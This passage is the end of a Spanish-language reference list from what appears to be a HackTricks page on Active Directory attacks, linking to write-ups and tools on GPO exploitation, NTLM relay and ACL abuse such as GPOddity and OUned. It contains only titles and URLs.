- [9] [Samba – net rpc (membresía de grupo)](https://www.samba.org/)
- [10] [HTB Puppy: abuso de ACL de AD, cracking de Argon2 de KeePassXC y descifrado de DPAPI para obtener acceso de administrador al DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: secuestro de rutas UNC de GPO para ejecución de código y NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: explotación de GPO de Active Directory mediante NTLM relay, y más](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [¿La OU se está riendo? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: explotación de vectores de ataque ACL de unidades organizativas ocultas en Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulación de servicios legítimos de Active Directory en la red: el caso de la explotación de GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
